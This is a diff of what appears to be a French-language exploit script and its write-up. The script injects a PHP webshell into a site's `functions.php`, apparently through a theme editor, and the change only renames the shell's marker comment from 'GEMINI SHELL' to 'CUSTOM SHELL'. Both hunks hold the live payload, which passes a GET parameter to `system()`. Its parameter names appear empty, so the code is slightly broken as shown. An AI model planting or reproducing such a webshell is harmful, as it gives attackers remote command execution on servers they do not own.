@@ -88,9 +88,9 @@ if not textarea_match:
 current_code = html.unescape(textarea_match.group(1))
 
 # Step 3: Ajout du Webshell
-payload = "\n\n// GEMINI SHELL\nif(isset($_GET[''])) { system($_GET['']); exit; }\n"
+payload = "\n\n// CUSTOM SHELL\nif(isset($_GET[''])) { system($_GET['']); exit; }\n"
 
-if "GEMINI SHELL" in current_code:
+if "CUSTOM SHELL" in current_code:
     print("[!] Shell already present. Skipping modification.")
     new_code = current_code
 else:
@@ -131,7 +131,7 @@ else:
 **Payload injecté dans `functions.php` :**
 
 ```php
-// GEMINI SHELL
+// CUSTOM SHELL
 if(isset($_GET[''])) { system($_GET['']); exit; }
 ```
 
